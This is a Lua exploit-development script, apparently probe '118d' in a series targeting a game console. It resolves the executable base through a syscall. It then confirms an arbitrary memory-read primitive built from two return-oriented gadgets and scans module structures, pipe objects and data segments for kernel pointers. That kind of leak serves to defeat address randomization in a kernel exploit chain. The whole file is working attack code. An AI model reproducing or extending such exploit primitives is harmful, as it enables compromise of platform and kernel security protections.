-- CRASH_CLASS: LOW
-- PROBE 118d: Test RDI+offset read gadgets + scan for kernel ptrs
--
-- 118b found: mov rax,[rdi+0x18];ret at eboot+0x5D940
--             mov rax,[rdi+0x10];ret at eboot+0xD68A0
--
-- native.fcall_with_rax(addr, rax, rdi) — RDI is the 3rd arg
-- To read address X: fcall_with_rax(G10, 0, X - 0x10)

print("=== PROBE 118d: RDI OFFSET READ ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200)
wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local EB = N(uint64(string.format("0x%X%08X",ehi,elo)))
print(string.format("eboot=0x%X%08X", ehi, elo))

local G10 = EB + 0xD68A0   -- mov rax,[rdi+0x10]; ret
local G18 = EB + 0x5D940   -- mov rax,[rdi+0x18]; ret

-- ============================================================
print("")
print("--- A: VALIDATE GADGETS ---")

local buf = memory.alloc(0x100)
local BUF = N(buf)
wq(BUF+0x00, uint64(0x1111111111111111))
wq(BUF+0x08, uint64(0x2222222222222222))
wq(BUF+0x10, uint64(0x3333333333333333))
wq(BUF+0x18, uint64(0x4444444444444444))
wq(BUF+0x20, uint64(0x5555555555555555))

print(string.format("  buf=0x%X", BUF))
print(string.format("  buf+0x10: %s (expect 3333)", fmt_ptr(rq(BUF+0x10))))
print(string.format("  buf+0x18: %s (expect 4444)", fmt_ptr(rq(BUF+0x18))))

-- Test G10: mov rax,[rdi+0x10]; rdi=buf → reads buf+0x10
local ok1, r1 = pcall(function() return native.fcall_with_rax(G10, 0, BUF) end)
print(string.format("  G10(rdi=buf): %s (expect 3333=buf+0x10)", ok1 and fmt_ptr(r1) or "FAIL"))

-- Test G18: mov rax,[rdi+0x18]; rdi=buf → reads buf+0x18
local ok2, r2 = pcall(function() return native.fcall_with_rax(G18, 0, BUF) end)
print(string.format("  G18(rdi=buf): %s (expect 4444=buf+0x18)", ok2 and fmt_ptr(r2) or "FAIL"))

-- Verify: read eboot via G10 → pass rdi=EB-0x10 → reads [EB-0x10+0x10]=[EB]
local eboot_mrq = rq(EB)
local ok3, r3 = pcall(function() return native.fcall_with_rax(G10, 0, EB-0x10) end)
print(string.format("  memory.rq(eboot): %s", fmt_ptr(eboot_mrq)))
print(string.format("  G10(rdi=EB-16):   %s (should match)", ok3 and fmt_ptr(r3) or "FAIL"))

local match = (fmt_ptr(eboot_mrq) == fmt_ptr(r3))
if match then
    print("  *** ARBITRARY READ CONFIRMED ***")
else
    print("  MISMATCH — gadget may not work as expected")
end

local c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
-- Define arb_read helper
local function arb_read(addr)
    local ok_r, val = pcall(function()
        return native.fcall_with_rax(G10, 0, addr - 0x10)
    end)
    if ok_r then return val end
    return nil
end

-- ============================================================
print("")
print("--- B: SCAN dynlib_get_info STRUCT ---")
-- Dump the full 0x160 byte struct to find data segment pointers
-- Check ALL qwords for kernel pointers and high non-zero pointers
local kp_info = 0
for off=0,0x158,8 do
    local val = rq(N(inf)+off)
    if val then
        local h,l = get_hi_lo(val)
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        local interesting = false
        if is_kptr(val) then
            kp_info = kp_info + 1
            print(string.format("  +0x%03X: %s *** KPTR ***", off, fmt_ptr(val)))
            interesting = true
        elseif h > 0 and h < 0xFFFF0000 then
            print(string.format("  +0x%03X: %s (userland ptr?)", off, fmt_ptr(val)))
            interesting = true
        end
    end
end
print(string.format("  kernel ptrs in dynlib struct: %d", kp_info))

c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- C: READ BEYOND EBOOT TEXT ---")
if not match then
    print("  skipping (gadget not confirmed)")
else
    -- Probe eboot at 256KB intervals for 8MB
    local kp_beyond = 0
    for mb=1,8 do
        local base = EB + mb * 0x100000
        local first_val = arb_read(base)
        if first_val == nil then
            print(string.format("  +%dMB: unreadable", mb))
        else
            local kp = 0
            for off=0,0x4000-8,8 do
                local val = arb_read(base + off)
                if val == nil then break end
                if is_kptr(val) then
                    kp = kp + 1
                    kp_beyond = kp_beyond + 1
                    print(string.format("  *** KPTR eboot+0x%X: %s ***", mb*0x100000+off, fmt_ptr(val)))
                    if kp_beyond >= 15 then break end
                end
            end
            if kp == 0 then
                print(string.format("  +%dMB: 16KB scanned, 0 kptrs", mb))
            end
        end
        if kp_beyond >= 15 then break end
    end
    print(string.format("  beyond-text kernel ptrs: %d", kp_beyond))
end

c = N(native.fcall_with_rax(stub,20))
if c~=pid then print("DIED!") return end

-- ============================================================
print("")
print("--- D: SCAN PIPE OBJECT ---")
local pipe_str = tostring(syscall.pipe)
print("  pipe: " .. (pipe_str or "nil"):sub(1,300))

local pipe_addrs = {}
for hex in pipe_str:gmatch("0x[0-9a-fA-F]+") do
    local val = tonumber(hex)
    if val and val > 0x10000 then
        table.insert(pipe_addrs, val)
    end
end

for i, pa in ipairs(pipe_addrs) do
    if i > 6 then break end
    local kp = 0
    for off=-0x80,0x100,8 do
        local val = arb_read(pa + off)
        if val and is_kptr(val) then
            kp = kp + 1
            print(string.format("  *** KPTR pipe[%d]+0x%X: %s ***", i, off, fmt_ptr(val)))
        end
    end
    if kp == 0 then
        print(string.format("  pipe[%d] (0x%X): 0 kptrs", i, pa))
    end
end

-- ============================================================
print("")
print("--- E: SCAN OTHER MODULE DATA ---")
-- Get libkernel info (handle 1) and scan its data area
local sc_info = mk(593)
for handle=1,4 do
    wd(inf,0x160)
    pcall(function() sc_info(uint64(handle), inf) end)
    local tl=rd(inf+0x108) or 0; local th=rd(inf+0x10C) or 0
    if th<0 then th=th+0x100000000 end
    if tl<0 then tl=tl+0x100000000 end
    if th==0 and tl==0 then break end
    local mod_base = N(uint64(string.format("0x%X%08X", th, tl)))
    print(string.format("  module %d: text=0x%X%08X", handle, th, tl))

    -- Check data hint: scan struct for a second base address
    -- Also check +0x148 and +0x150 for data segment
    local dl=rd(inf+0x148) or 0; local dh=rd(inf+0x14C) or 0
    if dh<0 then dh=dh+0x100000000 end
    if dl<0 then dl=dl+0x100000000 end
    if dh > 0 then
        local data_base = N(uint64(string.format("0x%X%08X", dh, dl)))
        print(string.format("    data=0x%X%08X", dh, dl))
        local kp = 0
        for off=0,0x4000-8,8 do
            local val = arb_read(data_base + off)
            if val == nil then break end
            if is_kptr(val) then
                kp = kp + 1
                print(string.format("    *** KPTR mod%d data+0x%X: %s ***", handle, off, fmt_ptr(val)))
                if kp >= 10 then break end
            end
        end
        if kp == 0 then print(string.format("    mod %d data: 0 kptrs in 16KB", handle)) end
    end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 118d COMPLETE ===")
